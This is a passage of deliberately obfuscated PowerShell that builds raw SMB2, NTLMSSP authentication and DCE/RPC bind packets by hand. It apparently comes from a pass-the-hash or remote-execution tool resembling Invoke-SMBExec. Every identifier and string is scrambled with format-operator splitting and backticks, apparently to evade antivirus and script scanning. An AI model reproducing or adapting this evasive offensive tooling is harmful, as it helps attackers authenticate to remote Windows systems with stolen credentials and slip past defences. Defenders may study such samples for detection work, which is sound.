        ${sMb2c`REa`TEReqUes`TFiLe}.("{1}{0}" -f'dd','A').Invoke(("{4}{1}{2}{3}{0}"-f 'tes','ileAtt','ri','bu','F'),[Byte[]](0x80,0x00,0x00,0x00))
        ${smb2c`ReA`TeREQuEStf`i`Le}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{2}{1}"-f'ShareA','ess','cc'),[Byte[]](0x01,0x00,0x00,0x00))
        ${s`Mb2cr`EAteReqUeS`TF`ilE}.("{0}{1}"-f 'A','dd').Invoke(("{0}{2}{1}{3}"-f'Create','sposit','Di','ion'),[Byte[]](0x01,0x00,0x00,0x00))
        ${SMB`2C`ReAt`er`eqUESt`F`ile}.("{1}{0}"-f 'dd','A').Invoke(("{2}{0}{1}{3}" -f'reateOpti','o','C','ns'),[Byte[]](0x40,0x00,0x00,0x00))
        ${smb2`C`ReAteRE`qU`e`stfI`le}.("{1}{0}"-f 'dd','A').Invoke(("{2}{1}{0}" -f'ffset','ameO','N'),[Byte[]](0x78,0x00))
        ${sMB2c`R`EA`TErE`quESTfI`le}.("{0}{1}"-f'A','dd').Invoke(("{1}{0}{2}"-f'ngt','NameLe','h'),${naMe_L`en`g`Th})
        ${sM`B`2CrEa`TeReqU`eS`TfiLe}.("{1}{0}" -f'dd','A').Invoke(("{4}{5}{1}{0}{2}{3}"-f 'tsO','ex','ff','set','CreateC','ont'),[Byte[]](0x00,0x00,0x00,0x00))
        ${SMB2C`REATe`ReQUES`Tfi`lE}.("{1}{0}"-f 'dd','A').Invoke(("{0}{1}{4}{2}{5}{3}" -f'Cr','e','eConte','ngth','at','xtsLe'),[Byte[]](0x00,0x00,0x00,0x00))
        ${SMb2`cRea`TE`REQ`UestfIle}.("{0}{1}" -f'A','dd').Invoke(("{0}{1}"-f'Buff','er'),${N`Am`edPIPe})
    
        return ${smb2`CreA`T`e`Re`QUESTfiLe}
    }
    
    function neW-pACKeT`smb2rEa`D`Re`q`UEsT
    {
        param ([Byte[]]${F`ileiD})
    
        ${s`mB2rE`Ad`REQue`st} = n`Ew`-OBJEcT ("{3}{6}{10}{1}{4}{8}{7}{2}{0}{11}{5}{9}" -f'ic','oll','Specialized.OrderedD','Syst','ect','on','e','.','ions','ary','m.C','ti')
        ${s`m`B2R`E`ADrEqUe`st}.("{1}{0}"-f'dd','A').Invoke(("{4}{0}{1}{3}{2}"-f'ruct','ur','e','eSiz','St'),[Byte[]](0x31,0x00))
        ${smb`2rEA`DrE`qU`Est}.("{0}{1}" -f'Ad','d').Invoke(("{1}{2}{0}" -f'ing','P','add'),[Byte[]](0x50))
        ${S`Mb`2rEadR`e`QuEst}.("{0}{1}" -f 'A','dd').Invoke(("{0}{1}" -f'Fl','ags'),[Byte[]](0x00))
        ${Sm`B`2Rea`DREQUest}.("{1}{0}"-f'd','Ad').Invoke(("{2}{1}{0}"-f 'ngth','e','L'),[Byte[]](0x00,0x00,0x10,0x00))
        ${Smb`2rEad`ReQU`EsT}.("{1}{0}" -f 'dd','A').Invoke(("{0}{1}"-f 'Offs','et'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${s`m`B2rEADReQue`St}.("{1}{0}" -f 'dd','A').Invoke(("{1}{0}" -f 'leID','Fi'),${f`I`lEiD})
        ${s`mb2RE`ADReQ`UeSt}.("{0}{1}"-f 'A','dd').Invoke(("{1}{2}{0}" -f 't','Minimum','Coun'),[Byte[]](0x00,0x00,0x00,0x00))
        ${SMB`2readrEQuE`St}.("{1}{0}" -f'd','Ad').Invoke(("{2}{1}{0}" -f 'l','nne','Cha'),[Byte[]](0x00,0x00,0x00,0x00))
        ${sM`B2`R`e`ADREqUEST}.("{1}{0}"-f'd','Ad').Invoke(("{0}{3}{1}{2}" -f'R','iningB','ytes','ema'),[Byte[]](0x00,0x00,0x00,0x00))
        ${SmB2r`EADrEqU`e`sT}.("{1}{0}"-f 'd','Ad').Invoke(("{5}{2}{1}{4}{3}{6}{0}" -f 'et','ne','n','nfo','lI','ReadCha','Offs'),[Byte[]](0x00,0x00))
        ${sMB2`REAd`Re`qU`est}.("{1}{0}" -f'dd','A').Invoke(("{3}{2}{0}{1}{5}{4}"-f 'n','g','nfoLe','ReadChannelI','h','t'),[Byte[]](0x00,0x00))
        ${SMB2rEad`R`E`Q`UeST}.("{1}{0}" -f 'dd','A').Invoke(("{0}{1}" -f 'Bu','ffer'),[Byte[]](0x30))
    
        return ${SMb`2reAdR`E`qUE`st}
    }
    
    function NEw-P`ACkeT`sMB`2wr`i`Te`REqUESt
    {
        param([Byte[]]${FiL`e`iD},[Int]${rpCl`e`Ngth})
    
        [Byte[]]${writE`_L`eN`Gth} =   (  g`ci  ("VAr"+"iA"+"ble:X"+"V8qNb") ).VaLuE::("{1}{0}{2}" -f'By','Get','tes').Invoke(${r`PclE`NgTH})
    
        ${smb2`wRIteREq`U`eSt} = neW`-`ObJE`cT ("{14}{7}{4}{10}{0}{9}{2}{12}{3}{11}{1}{8}{5}{13}{6}" -f'lec','.Or','i','S','.C','eredDi','tionary','tem','d','t','ol','pecialized','ons.','c','Sys')
        ${SMB2wrI`TEr`E`Q`Ue`st}.("{1}{0}" -f'd','Ad').Invoke(("{2}{1}{0}" -f 'uctureSize','tr','S'),[Byte[]](0x31,0x00))
        ${Smb2WriTErEq`U`E`st}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{3}{0}{1}"-f'O','ffset','D','ata'),[Byte[]](0x70,0x00))
        ${Sm`B2WRIteR`E`Qu`Est}.("{1}{0}" -f'd','Ad').Invoke(("{1}{0}"-f'th','Leng'),${w`RITe`_l`eNgTH})
        ${SMB2w`R`iTER`eQ`UEsT}.("{0}{1}" -f'Ad','d').Invoke(("{0}{1}" -f 'Of','fset'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${s`Mb2writerE`Q`U`EST}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}{2}" -f 'Fil','e','ID'),${Fi`Le`iD})
        ${S`mb2wR`I`TER`eQuEST}.("{1}{0}"-f'd','Ad').Invoke(("{1}{0}"-f'nel','Chan'),[Byte[]](0x00,0x00,0x00,0x00))
        ${SM`B`2W`Ri`TereqUEsT}.("{1}{0}"-f'dd','A').Invoke(("{1}{0}{2}"-f 'Byte','Remaining','s'),[Byte[]](0x00,0x00,0x00,0x00))
        ${sMB`2WR`iTE`REqu`eST}.("{0}{1}" -f 'A','dd').Invoke(("{6}{5}{3}{1}{2}{0}{4}" -f 'elInfo','Ch','ann','te','Offset','i','Wr'),[Byte[]](0x00,0x00))
        ${s`mb`2wRiteReqU`eST}.("{0}{1}" -f'Ad','d').Invoke(("{0}{4}{1}{3}{2}"-f 'W','l','nfoLength','I','riteChanne'),[Byte[]](0x00,0x00))
        ${s`M`B2W`RITER`equest}.("{0}{1}"-f 'A','dd').Invoke(("{0}{1}"-f'Fla','gs'),[Byte[]](0x00,0x00,0x00,0x00))
    
        return ${sM`B2`Wr`I`T`EREQuESt}
    }
    
    function NeW-PAcK`Et`Smb2cLoSe`ReQ`UEsT
    {
        param ([Byte[]]${FiL`eId})
    
        ${s`m`B2C`l`OsER`EQUesT} = nEW`-`O`BJECt ("{6}{7}{3}{9}{4}{5}{1}{12}{2}{11}{13}{10}{8}{0}" -f 'onary','i','ialize','.C','ec','t','Sys','tem','dDicti','oll','ere','d.Or','ons.Spec','d')
        ${sm`B2`ClOsER`eQ`UeST}.("{0}{1}" -f'A','dd').Invoke(("{2}{3}{1}{4}{0}"-f 'e','uctu','S','tr','reSiz'),[Byte[]](0x18,0x00))
        ${sMb2`CLOsE`REQU`Est}.("{0}{1}"-f 'Ad','d').Invoke(("{1}{0}" -f 's','Flag'),[Byte[]](0x00,0x00))
        ${SMb2cL`os`eR`E`Q`UeSt}.("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{1}" -f 'Res','ed','erv'),[Byte[]](0x00,0x00,0x00,0x00))
        ${smb`2closE`REQue`sT}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}"-f 'Fi','leID'),${F`iLeid})
    
        return ${sm`B`2ClOsErE`qUEST}
    }
    
    function new-pA`CkE`TSmB2TREe`di`S`co`NNe`CTREQu`est
    {
        ${SM`B2TREEDiS`CoN`N`eCTre`QuESt} = n`EW-oBJE`cT ("{1}{7}{4}{5}{6}{8}{0}{2}{3}"-f 'pecia','S','lized.OrderedDic','tionary','.C','ol','lecti','ystem','ons.S')
        ${SM`B`2`TreEDIs`CoNNe`Ctr`eQUEst}.("{0}{1}"-f 'A','dd').Invoke(("{3}{1}{0}{2}" -f'uctureS','r','ize','St'),[Byte[]](0x04,0x00))
        ${Smb2Treed`IsC`O`NN`E`ct`REQuESt}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{1}{0}"-f'd','rve','Rese'),[Byte[]](0x00,0x00))
    
        return ${s`Mb2Tr`E`EdIscOnnecT`ReQuE`ST}
    }
    
    function N`EW-`paCkEt`sM`B2SeS`SIonl`o`G`oF`FRe`qUESt
    {
        ${sMB2SesS`IonLOGo`FFREQ`Ue`st} = N`Ew-`oBJecT ("{1}{4}{7}{11}{0}{13}{3}{6}{5}{10}{9}{12}{2}{8}{14}"-f 'ec','S','i','alized','yste','der','.Or','m.Col','on','c','edDi','l','t','tions.Speci','ary')
        ${SMb2SE`sSi`o`NLOg`oF`FreQu`eST}.("{0}{1}" -f 'A','dd').Invoke(("{3}{1}{4}{2}{0}" -f'eSize','uc','r','Str','tu'),[Byte[]](0x04,0x00))
        ${Sm`B2sEsSiOnl`OGOFF`ReQue`sT}.("{1}{0}"-f'd','Ad').Invoke(("{0}{2}{1}" -f'Re','ed','serv'),[Byte[]](0x00,0x00))
    
        return ${sMb2s`ESsi`on`lOgOFfRE`q`U`esT}
    }

    function nE`w-pA`ckEtsMB`2qUEryINF`oR`EQUEST
    {
        param ([Byte[]]${I`NFo`TYPE},[Byte[]]${f`ILEIn`Fo`clASS},[Byte[]]${OuTp`U`T`Bu`FFErleNgth},[Byte[]]${iNPUtBu`FF`Er`ofFSEt},[Byte[]]${File`id},[Int]${B`UFF`ER})

        [Byte[]]${buFFeR`_B`Y`TEs} = ,0x00 * ${Buf`Fer}

        ${smB`2qUE`RYIN`F`OrE`queST} = nEw-ob`j`ect ("{2}{7}{0}{1}{3}{9}{5}{6}{8}{4}"-f 'ollection','s.Specia','System.','li','nary','d.Order','edDic','C','tio','ze')
        ${SMb2qu`Er`Yi`NFO`REQu`esT}.("{0}{1}"-f'Ad','d').Invoke(("{1}{2}{0}"-f'e','Structure','Siz'),[Byte[]](0x29,0x00))
        ${Sm`B`2QU`eRYiNf`OrequesT}.("{0}{1}"-f 'Ad','d').Invoke(("{1}{0}{2}"-f'T','Info','ype'),${Inf`oT`Y`PE})
        ${Smb`2q`UE`R`YinFOReQuesT}.("{0}{1}" -f 'A','dd').Invoke(("{1}{2}{4}{3}{0}"-f 's','FileI','nf','s','oCla'),${f`Ile`INfOc`LaSS})
        ${sm`B`2QUERYInf`ore`q`UeST}.("{1}{0}"-f 'd','Ad').Invoke(("{4}{3}{0}{2}{1}"-f'g','h','t','tBufferLen','Outpu'),${oUTPu`T`BUf`FeRLe`NgTh})
        ${Sm`B2QUERY`in`FO`RE`QUeST}.("{0}{1}" -f'Ad','d').Invoke(("{1}{2}{0}{3}"-f'Offs','InputBuff','er','et'),${inpuTbUf`F`eROf`Fs`Et})
        ${s`Mb2qUERyinF`Oreq`U`est}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}{2}"-f'Res','er','ved'),[Byte[]](0x00,0x00))
        ${Sm`B2`QuerYINf`O`ReQuEST}.("{1}{0}"-f'dd','A').Invoke(("{2}{3}{0}{1}" -f'Leng','th','InputB','uffer'),[Byte[]](0x00,0x00,0x00,0x00))
        ${sMB`2qUer`YiNFore`Q`UESt}.("{0}{1}"-f 'Ad','d').Invoke(("{2}{4}{0}{3}{1}"-f'it','nalInformation','Ad','io','d'),[Byte[]](0x00,0x00,0x00,0x00))
        ${S`Mb`2QUeR`yinF`Or`eQueSt}.("{0}{1}"-f'Ad','d').Invoke(("{0}{1}" -f 'Fla','gs'),[Byte[]](0x00,0x00,0x00,0x00))
        ${s`Mb2Qu`Er`YI`NFor`EQUeSt}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}"-f'D','FileI'),${FiL`eId})

        if(${BuFF`eR} -gt 0)
        {
            ${smB2q`U`eRyIN`F`Or`equeSt}.("{0}{1}" -f'A','dd').Invoke(("{1}{0}"-f 'r','Buffe'),${Bu`FfeR_`B`YtES})
        }

        return ${smb2`Q`U`E`RyINfoREqUesT}
    }

    function NEw`-PA`CkE`T`sMB`2`i`oCtLReqUEst
{
    param([Byte[]]${Fu`N`cTioN},[Byte[]]${fi`L`EnAmE},[Int]${le`N`gTh},[Int]${O`UtS`Ize})

    [Byte[]]${InDa`Ta`_leN`G`Th} =  (  vARi`AB`Le  ('Xv8'+'qN'+'B') -Valu  )::("{1}{0}{2}"-f 't','Ge','Bytes').Invoke(${L`eN`GTH} + 24)
    [Byte[]]${oU`T_`size} =  $Xv8QnB::("{0}{2}{1}"-f'Ge','Bytes','t').Invoke(${OutS`IzE})

    ${sMB`2IO`ct`lReQuEst} = n`eW-OB`JeCt ("{7}{5}{13}{12}{6}{4}{1}{3}{10}{9}{0}{8}{11}{2}" -f 'Ordered','peci','ary','al','ions.S','.','ct','System','D','zed.','i','iction','lle','Co')
    ${sMb2i`o`C`TlReq`UE`sT}.("{1}{0}" -f'd','Ad').Invoke(("{4}{1}{2}{3}{0}" -f'ze','tru','cture','Si','S'),[Byte[]](0x39,0x00))
    ${sMb2`IO`CTlR`e`QuE`st}.("{1}{0}" -f 'dd','A').Invoke(("{0}{1}{2}"-f'Res','erve','d'),[Byte[]](0x00,0x00))
    ${Sm`B2ioCTlREq`Ue`st}.("{0}{1}"-f'Ad','d').Invoke(("{0}{1}" -f 'Fu','nction'),${FUN`c`TioN})
    ${S`m`B2I`oc`TlreQUe`ST}.("{1}{0}" -f'dd','A').Invoke(("{1}{2}{0}" -f'ndle','GUID','Ha'),${f`I`LenamE})
    ${SMb`2`IOC`TlRe`qUe`St}.("{0}{1}" -f 'Ad','d').Invoke(("{3}{0}{4}{1}{2}" -f'D','Off','set','In','ata_'),[Byte[]](0x78,0x00,0x00,0x00))
    ${sm`B2I`OCT`L`ReqUeST}.("{0}{1}"-f 'A','dd').Invoke(("{2}{1}{0}{3}{4}" -f'a_Le','at','InD','n','gth'),${iN`d`A`TA_LEng`TH})
    ${sMB`2iO`CtLReQuE`St}.("{0}{1}"-f 'Ad','d').Invoke(("{1}{2}{0}{3}{4}"-f 'InSi','MaxIo','ctl','z','e'),[Byte[]](0x00,0x00,0x00,0x00))
    ${SMB2IO`ctLr`eQu`E`ST}.("{1}{0}" -f'd','Ad').Invoke(("{0}{4}{1}{3}{2}" -f 'Ou','_','fset','Of','tData'),[Byte[]](0x78,0x00,0x00,0x00))
    ${SMb2Io`ctL`ReQ`U`eST}.("{1}{0}"-f 'dd','A').Invoke(("{1}{2}{0}{3}"-f't','Out','Data_Leng','h'),[Byte[]](0x00,0x00,0x00,0x00))
    ${s`MB`2`iO`CTl`REqUesT}.("{0}{1}"-f'Ad','d').Invoke(("{0}{1}{3}{2}" -f'MaxI','octl','ze','OutSi'),${oUT_`sizE})
    ${sM`B2i`oCTLRE`qUest}.("{0}{1}"-f'A','dd').Invoke(("{1}{0}" -f 'ags','Fl'),[Byte[]](0x01,0x00,0x00,0x00))
    ${S`mb`2iOCtLRe`QUEST}.("{0}{1}" -f'A','dd').Invoke(("{1}{2}{0}"-f'2','R','eserved'),[Byte[]](0x00,0x00,0x00,0x00))

    if(${oUt`_si`Ze} -eq 40)
    {
        ${s`m`B2`iOCTlr`E`quEst}.("{1}{0}"-f 'dd','A').Invoke(("{2}{0}{5}{3}{4}{1}" -f 'n','s','I','_Capabilit','ie','Data'),[Byte[]](0x7f,0x00,0x00,0x00))
        ${SMb`2`Ioc`TlrE`qu`EST}.("{1}{0}" -f 'dd','A').Invoke(("{3}{2}{1}{0}" -f'GUID','Client','a_','InDat'),[Byte[]](0xc7,0x11,0x73,0x1e,0xa5,0x7d,0x39,0x47,0xaf,0x92,0x2d,0x88,0xc0,0x44,0xb1,0x1e))
        ${SM`B`2iOctlReQu`e`ST}.("{1}{0}"-f 'd','Ad').Invoke(("{5}{1}{0}{2}{4}{3}" -f'ta_Sec','Da','u','de','rityMo','In'),[Byte[]](0x01))
        ${Smb`2`iOCtlR`EQU`EsT}.("{1}{0}"-f 'dd','A').Invoke(("{4}{0}{3}{2}{1}"-f 'n','known','Un','Data_','I'),[Byte[]](0x00))
        ${sM`B`2IoCt`LrEQUESt}.("{0}{1}"-f 'Ad','d').Invoke(("{5}{3}{2}{1}{4}{0}"-f 't','ectCou','Dial','ata_','n','InD'),[Byte[]](0x02,0x00))
        ${SMb`2i`o`CTLrE`Que`sT}.("{0}{1}"-f 'A','dd').Invoke(("{1}{0}{3}{2}" -f 'D','In','Dialect','ata_'),[Byte[]](0x02,0x02))
        ${smb`2IOC`TL`Req`UEsT}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{0}{1}"-f'a_','Dialect2','InDat'),[Byte[]](0x10,0x02))
    }

    return ${SMB`2iO`ct`Lr`EQUEST}
}

    

    function nEW-PA`C`ketnT`LmSsPN`E`G`oTia`TE
    {
        param([Byte[]]${NEgoT`I`At`efLAgS},[Byte[]]${v`ErsIoN})
    
        [Byte[]]${nT`lM`ss`p`_leNgTh} = ( ( vArI`A`Ble  xv8Qnb).ValUE::("{0}{1}{2}" -f 'Get','Byt','es').Invoke(${V`eRS`iON}."L`eNgTh" + 32))[0]
        [Byte[]]${as`N`_LenGt`H_1} = ${n`TLMS`SP_leNgTH}[0] + 32
        [Byte[]]${a`sn`_leNGTH_2} = ${NTl`ms`SP_`LenGtH}[0] + 22
        [Byte[]]${ASN`_`LEn`GtH_3} = ${nTl`M`ss`P_lE`NgTH}[0] + 20
        [Byte[]]${A`s`N_lengTH_4} = ${NT`LMSsP_L`engtH}[0] + 2
    
        ${nTlMS`S`pN`E`goTiaTe} = neW-`OB`jECt ("{3}{7}{9}{6}{10}{8}{14}{4}{1}{13}{5}{0}{2}{12}{11}" -f 'redD','alized.O','ict','System.Collec','ci','de','.','ti','p','ons','S','ry','iona','r','e')
        ${ntLMss`pne`G`OtI`ATE}.("{1}{0}"-f'dd','A').Invoke(("{0}{1}{4}{2}{3}"-f 'Initial','ContextT','en','ID','ok'),[Byte[]](0x60))
        ${NT`lmSs`p`NEg`OTi`ATe}.("{1}{0}" -f 'd','Ad').Invoke(("{5}{2}{0}{4}{3}{1}{6}" -f 'n','nLeng','co','e','textTok','Initial','th'),${aSN_`l`Eng`TH_1})
        ${n`TLMsSPnegoT`i`Ate}.("{1}{0}" -f 'dd','A').Invoke(("{0}{2}{3}{1}"-f 'ThisMec','D','h','I'),[Byte[]](0x06))
        ${NT`lmsSPN`Eg`O`Tia`Te}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{3}{2}{0}{4}" -f'Me','T','is','h','chLength'),[Byte[]](0x06))
        ${N`TLmssPn`E`gotIA`Te}."A`Dd"("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
        ${NT`L`ms`SP`Ne`gOtIAte}.("{1}{0}"-f 'dd','A').Invoke(("{2}{1}{3}{4}{5}{0}"-f 'ID','C','Inner','onte','x','tToken'),[Byte[]](0xa0))
        ${ntL`MSsP`NeGOtiA`Te}.("{0}{1}"-f'A','dd').Invoke(("{2}{6}{1}{4}{0}{3}{5}"-f 'o','r','In','ntextToke','C','nLength','ne'),${ASN_le`NG`T`h_2})
        ${nTl`MS`sp`NeGOtIAte}.("{0}{1}" -f 'A','dd').Invoke(("{4}{5}{0}{1}{2}{3}" -f'nerC','ontextToke','n','ID2','I','n'),[Byte[]](0x30))
        ${ntlm`SsPNEgoTi`A`TE}.("{0}{1}" -f 'A','dd').Invoke(("{2}{1}{6}{5}{4}{3}{0}" -f'h2','C','Inner','gt','nLen','ke','ontextTo'),${As`N`_l`ENg`TH_3})
        ${ntlm`SSP`N`EgoTiAtE}.("{1}{0}"-f'dd','A').Invoke(("{2}{1}{0}"-f 'D','pesI','MechTy'),[Byte[]](0xa0))
        ${N`TL`m`sspNEgoTi`A`Te}.("{0}{1}"-f 'A','dd').Invoke(("{0}{1}{2}" -f 'MechTyp','esLengt','h'),[Byte[]](0x0e))
        ${Ntl`m`ss`pnegOTi`A`TE}.("{1}{0}" -f'd','Ad').Invoke(("{2}{3}{1}{0}" -f '2','esID','Me','chTyp'),[Byte[]](0x30))
        ${ntl`mssp`Ne`GO`TiATE}.("{1}{0}" -f'd','Ad').Invoke(("{2}{0}{3}{1}" -f 'echT','ngth2','M','ypesLe'),[Byte[]](0x0c))
        ${N`TLM`SSpneGOt`iATE}.("{1}{0}"-f'd','Ad').Invoke(("{1}{3}{2}{0}" -f 'D3','Me','ypesI','chT'),[Byte[]](0x06))
        ${NTLmS`SP`Ne`GOTIATe}.("{0}{1}" -f 'Ad','d').Invoke(("{1}{4}{0}{3}{2}"-f'esLeng','MechTy','3','th','p'),[Byte[]](0x0a))
        ${n`TL`MSsP`NegotiaTE}.("{1}{0}"-f 'dd','A').Invoke(("{2}{1}{0}"-f 'ype','echT','M'),[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
        ${n`T`l`m`s`SPnEGotIate}.("{0}{1}" -f'Ad','d').Invoke(("{1}{2}{3}{0}" -f 'D','M','echTo','kenI'),[Byte[]](0xa2))
        ${nT`lMSSPNeGoT`I`ATE}.("{0}{1}"-f 'Ad','d').Invoke(("{2}{0}{3}{1}" -f'hToke','ngth','Mec','nLe'),${aSN_`L`eN`GTh_4})
        ${NtlMsS`pne`G`o`TI`AtE}.("{1}{0}" -f'dd','A').Invoke(("{2}{0}{3}{1}" -f 'SSP','D','NTLM','I'),[Byte[]](0x04))
        ${NTl`Ms`SPne`goti`AtE}.("{1}{0}" -f 'dd','A').Invoke(("{0}{2}{1}" -f'NT','PLength','LMSS'),${nTLms`sP_l`eNg`Th})
        ${ntLMsS`p`NEg`OtiA`Te}.("{0}{1}" -f 'A','dd').Invoke(("{2}{1}{0}" -f 'ier','if','Ident'),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        ${Nt`Lm`ssPn`egot`iate}.("{0}{1}"-f'A','dd').Invoke(("{2}{0}{1}"-f'essag','eType','M'),[Byte[]](0x01,0x00,0x00,0x00))
        ${n`TLM`SspNEg`OtiATe}.("{1}{0}" -f 'd','Ad').Invoke(("{3}{1}{2}{0}" -f 'gs','ego','tiateFla','N'),${n`eG`OTIaTefl`AgS})
        ${n`TlMSs`pN`eGotiA`Te}.("{0}{1}" -f 'Ad','d').Invoke(("{3}{0}{1}{5}{2}{4}{6}" -f 'n','gWo','station','Calli','Do','rk','main'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${NT`lms`spnegoTI`ATe}.("{0}{1}"-f 'A','dd').Invoke(("{3}{1}{2}{0}" -f 'me','ngWorkstati','onNa','Calli'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    
        if(${vERs`i`on})
        {
            ${NTlMSSpnEg`O`T`IA`Te}.("{0}{1}" -f 'A','dd').Invoke(("{2}{0}{1}"-f'sio','n','Ver'),${Ve`RSioN})
        }
    
        return ${NtlMsSPn`eg`O`TIAte}
    }
    
    function new-p`AC`k`EtnTlmssP`A`UTH
    {
        param([Byte[]]${ntlmr`ESP`O`Nse})
    
        [Byte[]]${Nt`l`msSP_`LEN`GTH} = ( $xv8QNB::("{0}{2}{1}"-f 'Get','tes','By').Invoke(${NT`LM`Res`POnSE}."Le`NgTh"))[1,0]
        [Byte[]]${AS`N_le`NG`TH_1} = ( $XV8QNb::("{2}{1}{0}"-f'Bytes','t','Ge').Invoke(${N`Tl`mRE`Sp`OnsE}."lEn`gth" + 12))[1,0]
        [Byte[]]${Asn_l`E`Ngth`_2} = (  (i`Tem  ('VA'+'RIaB'+'lE:Xv8q'+'nB') ).vALUE::("{0}{2}{1}"-f 'Get','tes','By').Invoke(${N`TlM`RE`sPonSE}."LeN`GTh" + 8))[1,0]
        [Byte[]]${AS`N_Le`NgtH`_3} = (  $xV8Qnb::("{0}{1}" -f'Ge','tBytes').Invoke(${N`T`LMrespo`N`SE}."L`eN`gTH" + 4))[1,0]
    
        ${NtL`MSS`pA`UtH} = NEw-O`BJ`Ect ("{10}{9}{11}{1}{5}{2}{4}{6}{12}{7}{0}{3}{8}" -f 'deredDic','ollect','ns.','tionar','Specia','io','lize','.Or','y','em','Syst','.C','d')
        ${N`TlmS`SPAu`TH}.("{1}{0}"-f 'dd','A').Invoke(("{0}{1}" -f 'ASNI','D'),[Byte[]](0xa1,0x82))
        ${n`T`L`mSSPAUTh}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}"-f'ength','ASNL'),${aS`N_`L`EnGth_1})
        ${Nt`Lm`ssP`AUTh}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{2}{1}" -f 'A','ID2','SN'),[Byte[]](0x30,0x82))
        ${NtlMss`pa`Uth}.("{0}{1}"-f 'Ad','d').Invoke(("{3}{0}{1}{2}" -f'SN','Le','ngth2','A'),${a`SN_`lE`NGth`_2})
        ${n`T`lMsSpau`TH}.("{0}{1}" -f'Ad','d').Invoke(("{1}{0}" -f 'D3','ASNI'),[Byte[]](0xa2,0x82))
        ${nTL`MssP`AuTH}.("{0}{1}" -f 'A','dd').Invoke(("{3}{0}{2}{1}" -f'NL','gth3','en','AS'),${As`N_l`E`Ngth_3})
        ${NT`lmsS`pA`UTh}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{3}{2}{1}" -f 'N','SSPID','M','TL'),[Byte[]](0x04,0x82))
        ${n`Tlm`s`spaUth}.("{1}{0}"-f 'd','Ad').Invoke(("{3}{1}{0}{2}" -f'ngt','SPLe','h','NTLMS'),${N`TlMs`s`p`_LENgTH})
        ${n`TLMSSp`Auth}.("{1}{0}"-f 'dd','A').Invoke(("{0}{2}{3}{1}" -f'NT','nse','LMRe','spo'),${NTlm`R`e`SpO`NsE})
    
        return ${ntl`m`sSpa`UTh}
    }

    

    function n`EW`-pA`cKetrP`CBiND
    {
        param([Byte[]]${fr`A`gleN`GTh},[Int]${Cal`lId},[Byte[]]${nUmc`T`XiT`eMS},[Byte[]]${Co`Nt`eXtid},[Byte[]]${UU`ID},[Byte[]]${UuiD`Ve`RSIon})
    
        [Byte[]]${c`A`ll_ID} =  (  variab`lE Xv8qnB -valUeONl  )::("{1}{0}{2}"-f'By','Get','tes').Invoke(${C`AlLiD})
    
        ${r`PC`BInD} = n`e`W-ObJECT ("{7}{1}{6}{2}{3}{4}{5}{8}{0}"-f 'ry','.Special','O','rd','ere','dDict','ized.','System.Collections','iona')
        ${R`PCB`IND}.("{0}{1}"-f 'A','dd').Invoke(("{0}{1}"-f'Versi','on'),[Byte[]](0x05))
        ${rpc`BI`ND}.("{1}{0}"-f 'd','Ad').Invoke(("{3}{2}{0}{1}" -f 'i','onMinor','ers','V'),[Byte[]](0x00))
        ${R`Pc`BiNd}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{2}{1}"-f'Pac','ype','ketT'),[Byte[]](0x0b))
        ${rpc`B`IND}.("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}{2}" -f'Packet','F','lags'),[Byte[]](0x03))
        ${rpc`Bi`Nd}.("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}{5}{2}{4}{3}"-f'DataRe','p','nt','n','atio','rese'),[Byte[]](0x10,0x00,0x00,0x00))
        ${rp`c`BInd}.("{0}{1}"-f'Ad','d').Invoke(("{0}{2}{1}{3}" -f'Fr','g','a','Length'),${f`RAGl`EngTH})
        ${R`pcB`INd}.("{1}{0}"-f'd','Ad').Invoke(("{0}{2}{1}"-f 'AuthLe','gth','n'),[Byte[]](0x00,0x00))
        ${rP`C`Bind}.("{0}{1}"-f'Ad','d').Invoke(("{1}{0}" -f'D','CallI'),${CAL`l`_id})
        ${RPc`B`ind}.("{1}{0}"-f'dd','A').Invoke(("{1}{0}{2}"-f'xXmit','Ma','Frag'),[Byte[]](0xb8,0x10))
        ${rPCb`i`Nd}.("{0}{1}" -f'Ad','d').Invoke(("{3}{0}{2}{1}" -f 'xR','Frag','ecv','Ma'),[Byte[]](0xb8,0x10))
        ${RPCBi`ND}.("{0}{1}"-f'A','dd').Invoke(("{0}{2}{1}"-f 'As','roup','socG'),[Byte[]](0x00,0x00,0x00,0x00))
        ${rp`Cbi`Nd}.("{1}{0}" -f'd','Ad').Invoke(("{0}{2}{1}"-f 'Nu','s','mCtxItem'),${N`UMctxI`Te`Ms})
        ${r`Pc`BiND}.("{0}{1}"-f 'A','dd').Invoke(("{1}{2}{0}"-f 'wn','Un','kno'),[Byte[]](0x00,0x00,0x00))
        ${RP`c`BINd}.("{1}{0}" -f'dd','A').Invoke(("{1}{0}" -f'textID','Con'),${cON`Te`Xtid})
        ${rPc`B`iNd}.("{1}{0}"-f 'd','Ad').Invoke(("{3}{2}{1}{0}" -f 'ems','It','ns','NumTra'),[Byte[]](0x01))
        ${r`PCbI`ND}.("{0}{1}"-f'Ad','d').Invoke(("{2}{1}{0}" -f '2','nknown','U'),[Byte[]](0x00))
        ${Rpc`B`INd}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{0}{1}"-f 'rfac','e','Inte'),${U`Uid})
